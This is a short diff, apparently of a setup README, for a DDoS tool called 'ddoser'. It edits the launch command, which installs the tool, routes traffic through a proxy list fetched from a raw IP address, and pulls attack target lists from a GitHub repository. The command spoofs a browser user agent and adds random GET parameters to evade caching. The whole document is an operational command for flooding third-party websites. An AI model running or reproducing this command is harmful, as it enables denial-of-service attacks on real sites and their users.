@@ -16,7 +16,7 @@ cd ddoser/
 python3 -m venv venv
 source venv/bin/activate
 pip3 install -r requirements.txt
-nohup python3 ./ddoser.py \
+python3 ./ddoser.py \
 --proxy-url 'http://143.244.166.15/proxy.list' \
 --target-urls-file 'https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt' \
 --target-urls-file 'https://github.com/hem017/cytro/raw/master/special_targets.txt' \
@@ -28,5 +28,4 @@ nohup python3 ./ddoser.py \
 --user-agent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' \
 --with-random-get-param \
 --restart-period 600 \
---log-to-stdout \
->ddoser.stdout 2>ddoser.stderr &
+--log-to-stdout
